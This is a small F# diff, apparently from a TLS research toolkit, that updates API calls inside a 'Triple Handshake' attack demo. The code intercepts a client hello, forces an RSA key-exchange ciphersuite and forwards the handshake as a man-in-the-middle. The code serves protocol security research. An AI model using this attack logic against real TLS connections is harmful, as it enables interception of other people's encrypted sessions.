@@ -62,12 +62,12 @@ type Attack_TripleHandshake =
 
         // Receive client hello and ensure the client proposes at least one RSA key exchange ciphersuite
         let sst,snsc,sch = FlexClientHello.receive(sst) in
-        match Handshake.negotiate sch.ciphersuites rsa_kex_css with
+        match Handshake.negotiate (FlexClientHello.getCiphersuites sch) rsa_kex_css with
         | None -> failwith "Triple Handshake demo only implemented for RSA key exchange"
         | Some(rsa_kex_cs) -> 
         
         // Reuse the honest client hello message, but enforce an RSA kex ciphersuite
-        let cch = { sch with ciphersuites = [rsa_kex_cs] } in
+        let cch = { sch with ciphersuites = Some([rsa_kex_cs]) } in
         let cst,cnsc,cch = FlexClientHello.send(cst,cch) in
 
         // Forward server hello, and get access to the honest server random
